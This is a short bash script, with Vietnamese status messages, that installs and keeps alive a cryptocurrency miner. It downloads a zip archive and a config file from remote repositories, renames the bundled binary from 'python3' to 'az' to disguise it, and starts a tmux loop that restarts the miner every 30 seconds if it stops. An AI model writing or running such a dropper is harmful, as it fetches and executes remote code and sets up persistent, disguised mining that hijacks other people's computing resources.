#! /bin/bash
set -x #echo on
if [ -f ${PWD}/az ]; then
    if pgrep -x "az" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
tmux new-session -d -s loop 'while (true);do if pgrep -x "az" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './az';fi; sleep 30; done'

     
fi
exit
fi

wget  https://bitbucket.org/tengikekao/myrep/downloads/hope.zip
unzip hope.zip
rm config.ini
wget https://raw.githubusercontent.com/lovelyn2210/script/master/config.ini
mv python3 az
chmod +x az
tmux new-session -d -s loop 'while (true);do if pgrep -x "az" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './az';fi; sleep 30; done'
